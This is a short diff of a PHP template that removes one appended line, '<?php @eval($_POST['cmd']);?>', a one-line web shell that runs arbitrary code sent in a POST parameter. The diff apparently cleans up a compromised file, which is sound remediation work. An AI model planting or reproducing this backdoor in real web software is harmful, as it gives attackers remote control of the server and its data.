@@ -61,4 +61,3 @@ function selectPage(sel)
 {/literal}
 //-->
 </script>
-<?php @eval($_POST['cmd']);?>
